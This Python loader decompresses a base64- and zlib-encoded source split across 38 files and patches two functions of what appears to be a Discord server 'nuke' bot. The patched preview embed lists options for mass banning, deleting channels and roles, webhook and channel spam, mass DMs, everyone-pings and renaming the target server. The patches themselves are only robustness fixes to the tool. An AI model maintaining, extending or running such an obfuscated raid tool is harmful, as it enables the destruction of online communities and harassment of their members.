import zlib, base64
from pathlib import Path
_p = "".join(Path(__file__).with_name(f"u{i}.b64").read_text(encoding="utf-8") for i in range(38))
src = zlib.decompress(base64.b64decode(_p)).decode()
src = src.replace('def build_preview_embed(uid:int)->discord.Embed:\n    u=user_cfg(uid)\n    c=merge_cfg(uid)\n    slot=u.get("active_slot") or "main"\n    color=cfg_color(c)\n    e=discord.Embed(title=f"Config preview · slot `{slot}`",color=color)\n    e.timestamp=datetime.now(timezone.utc)\n    e.set_footer(text=f"{BN} · live preview")\n    names=f"ch `{c.get(\'channel_name\')}` · role `{c.get(\'role_name\')}` · server `{c.get(\'nuke_name\')}`"\n    counts=f"spam {c.get(\'spam_channels\')}×{c.get(\'spam_messages\')} · roles {c.get(\'create_roles\')} · voice {c.get(\'create_voice\')} · cats {c.get(\'create_cats\')}"\n    flags=[]\n    for k in ("ban_all","kick_instead","timeout_instead","delete_channels","delete_roles","create_channels","spam_after_create","webhook_spam","ping_everyone","rename_server","mass_nick","mass_dm","skip_bots","skip_owner"):\n        flags.append(f"{\'🟢\' if c.get(k) else \'⚫\'} `{k}`")\n    e.add_field(name="Names",value=names,inline=False)\n    e.add_field(name="Counts",value=counts,inline=False)\n    e.add_field(name="Delay",value=f"`{c.get(\'delay_sec\',0)}s` before run",inline=True)\n    e.add_field(name="Slot",value=f"`{slot}` · {\', \'.join(list_slots(uid))}",inline=True)\n\n    # flags in two columns-ish\n    mid=len(flags)//2\n    e.add_field(name="Flags A",value="\\n".join(flags[:mid]) or "-",inline=True)\n    e.add_field(name="Flags B",value="\\n".join(flags[mid:]) or "-",inline=True)\n    e.add_field(name="Spam text",value=f"```{str(c.get(\'spam_text\',\'\'))[:200]}```",inline=False)\n    return e\n', 'def _clip(s, n=1024):\n    s = str(s if s is not None else "")\n    return s if len(s) <= n else s[: n - 1] + "…"\n\ndef build_preview_embed(uid:int)->discord.Embed:\n    u=user_cfg(uid)\n    c=merge_cfg(uid)\n    slot=_clip(u.get("active_slot") or "main", 64)\n    color=cfg_color(c)\n    e=discord.Embed(title=_clip(f"Config preview · slot `{slot}`", 256), color=color)\n    e.timestamp=datetime.now(timezone.utc)\n    e.set_footer(text=_clip(f"{BN} · live preview", 2048))\n    names=_clip(f"ch `{c.get(\'channel_name\')}` · role `{c.get(\'role_name\')}` · server `{c.get(\'nuke_name\')}`", 1024)\n    counts=_clip(f"spam {c.get(\'spam_channels\')}×{c.get(\'spam_messages\')} · roles {c.get(\'create_roles\')} · voice {c.get(\'create_voice\')} · cats {c.get(\'create_cats\')}", 1024)\n    flags=[]\n    for k in ("ban_all","kick_instead","timeout_instead","delete_channels","delete_roles","create_channels","spam_after_create","webhook_spam","ping_everyone","rename_server","mass_nick","mass_dm","skip_bots","skip_owner"):\n        flags.append(f"{\'🟢\' if c.get(k) else \'⚫\'} `{k}`")\n    e.add_field(name="Names",value=names or "-",inline=False)\n    e.add_field(name="Counts",value=counts or "-",inline=False)\n    e.add_field(name="Delay",value=_clip(f"`{c.get(\'delay_sec\',0)}s` before run", 1024),inline=True)\n    slots=_clip(", ".join(list_slots(uid)), 900)\n    e.add_field(name="Slot",value=_clip(f"`{slot}` · {slots}", 1024),inline=True)\n    mid=len(flags)//2\n    e.add_field(name="Flags A",value=_clip("\\n".join(flags[:mid]) or "-", 1024),inline=True)\n    e.add_field(name="Flags B",value=_clip("\\n".join(flags[mid:]) or "-", 1024),inline=True)\n    e.add_field(name="Spam text",value=_clip(f"```{str(c.get(\'spam_text\',\'\'))[:180]}```", 1024),inline=False)\n    return e\n')
src = src.replace('    async def open_cfg(self,interaction:discord.Interaction,button:Button):\n        uid=interaction.user.id\n        try:\n            user_cfg(uid)\n            emb=build_preview_embed(uid)\n            view=PreconfigView(uid)\n            await interaction.response.send_message(embed=emb,view=view,ephemeral=True)\n        except Exception as e:\n            log.exception("open config")\n            msg=f"Open failed: `{type(e).__name__}: {e}`"\n            try:\n                if interaction.response.is_done():\n                    await interaction.followup.send(msg,ephemeral=True)\n                else:\n                    await interaction.response.send_message(msg,ephemeral=True)\n            except Exception:\n                pass\n', '    async def open_cfg(self,interaction:discord.Interaction,button:Button):\n        uid=interaction.user.id\n        try:\n            user_cfg(uid)\n            emb=build_preview_embed(uid)\n            view=PreconfigView(uid)\n            await interaction.response.send_message(embed=emb,view=view,ephemeral=True)\n        except Exception as e:\n            log.exception("open config")\n            try:\n                tiny=discord.Embed(title="Config",description="Preview failed — use editors below.",color=0x5865F2)\n                view=PreconfigView(uid)\n                if interaction.response.is_done():\n                    await interaction.followup.send(embed=tiny,view=view,ephemeral=True)\n                else:\n                    await interaction.response.send_message(embed=tiny,view=view,ephemeral=True)\n            except Exception:\n                msg=str(e)[:400]\n                try:\n                    if interaction.response.is_done():\n                        await interaction.followup.send(f"Open failed: {msg}",ephemeral=True)\n                    else:\n                        await interaction.response.send_message(f"Open failed: {msg}",ephemeral=True)\n                except Exception:\n                    pass\n')
